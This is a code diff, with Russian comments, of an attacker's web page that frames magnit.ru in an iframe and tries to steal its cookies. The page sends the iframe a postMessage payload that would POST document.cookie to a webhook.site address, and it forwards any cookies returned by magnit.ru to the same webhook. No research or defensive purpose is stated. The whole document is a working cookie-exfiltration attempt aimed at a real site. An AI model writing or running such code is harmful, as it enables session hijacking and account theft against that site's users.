@@ -13,24 +13,29 @@
         window.addEventListener('message', function(event) {
             if (event.origin === 'https://magnit.ru') {
                 console.log('✅ Получено сообщение от magnit.ru:', event.data);
-                // Если это cookies, отправляем на webhook
-                if (event.data && event.data.includes('cookie')) {
+                // Отправляем cookies на webhook
+                if (event.data && event.data.cookies) {
                     fetch('https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b', {
                         method: 'POST',
-                        body: event.data
+                        body: event.data.cookies
                     });
                 }
             }
         });
         
-        // Внедряем скрипт в iframe через изменение src
+        // Внедряем скрипт в iframe
         document.getElementById('target').onload = function() {
             console.log('✅ iframe загружен');
             
-            // Пытаемся отправить сообщение в iframe
             try {
                 var iframeWindow = document.getElementById('target').contentWindow;
-                iframeWindow.postMessage('getCookies', 'https://magnit.ru');
+                
+                // Отправляем сообщение в iframe
+                iframeWindow.postMessage({
+                    type: 'getCookies',
+                    payload: 'fetch("https://webhook.site/21c3af15-0f47-46fb-ac1e-82bb9b5f523b", {method:"POST", body:document.cookie})'
+                }, 'https://magnit.ru');
+                
                 console.log('✅ postMessage отправлен');
             } catch(e) {
                 console.log('❌ Ошибка postMessage:', e.message);
